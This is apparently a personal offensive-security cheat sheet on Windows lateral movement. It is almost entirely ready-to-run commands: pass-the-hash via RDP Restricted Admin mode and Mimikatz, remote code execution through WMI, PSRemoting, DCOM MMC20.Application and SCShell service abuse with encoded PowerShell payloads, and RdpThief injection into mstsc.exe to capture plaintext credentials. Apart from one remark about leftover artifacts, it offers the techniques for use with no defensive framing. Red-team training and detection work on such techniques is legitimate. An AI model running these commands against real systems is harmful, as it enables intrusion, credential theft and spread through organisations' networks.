---
layout: page
title: "Windows Lateral Movement"
---

# Windows Lateral Movement

Most Windows lateral movement techniques require local admin on the target and reuse an NTLM hash or Kerberos ticket. The tradecraft question is which API calls and artifacts each technique leaves behind.

## RDP

```shell
# Clear-text credentials (Kali)
xfreerdp /d:corp1 /u:admin /p:'lab' /v:192.168.1.10

# Pass-the-Hash via Restricted Admin Mode (Kali)
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.1.10 /cert-ignore
```

```powershell
# Enable Restricted Admin Mode on target (if disabled)
# From a Mimikatz PTH shell on the target:
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0

# Pass-the-Hash to open mstsc (Windows attacker)
mimikatz.exe
privilege::debug
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```

## WMI

```powershell
# Execute command on remote host (clear-text)
$username = 'corp1\admin'
$password = ConvertTo-SecureString 'lab' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-WmiMethod -ComputerName appsrv01 -Credential $cred -Class Win32_Process -Name Create -ArgumentList 'cmd /c whoami > C:\output.txt'

# From domain context (no explicit creds needed)
Invoke-WmiMethod -ComputerName appsrv01 -Class Win32_Process -Name Create -ArgumentList 'powershell -enc <base64>'
```

## PSRemoting (WinRM)

```powershell
# Interactive session
Enter-PSSession -ComputerName appsrv01 -Credential corp1\admin

# One-liner execution
Invoke-Command -ComputerName appsrv01 -ScriptBlock { whoami; hostname }

# Pass-the-Hash: launch powershell in PTH context first, then PSRemote
mimikatz.exe
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell

# In the new PowerShell window:
Enter-PSSession -ComputerName appsrv01
```

## DCOM (MMC Application)

```powershell
# Instantiate DCOM object on remote target
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c powershell -enc <base64>", "7")
```

## SCShell (Service Config Abuse)

```powershell
# Windows binary
SCShell.exe <target> <service> <payload> <domain> <username> <password>
SCShell.exe 192.168.1.10 SensorService "cmd /c powershell -enc <base64>" corp1 admin lab

# Python + Pass-the-Hash (Kali)
python scshell.py -service-name SensorService corp1/admin@192.168.1.10 \
  -hashes 00000000000000000000000000000000:2892D26CDF84D7A70E2EB3B9F05C425E
```

## RDP Credential Theft (RdpThief)

Inject `RdpThief.dll` into any `mstsc.exe` process before the user types credentials. The hook intercepts `CredIsMarshaledCredentialW` and writes plaintext to a temp file.

```powershell
# Run injector on compromised host: it loops watching for mstsc.exe
.\Inject.exe

# After victim uses mstsc, read output
type C:\Users\<user>\AppData\Local\Temp\<session_id>\data.bin
```

Credentials appear in the format: `Server: dc01 / Username: corp1\admin / Password: lab`.
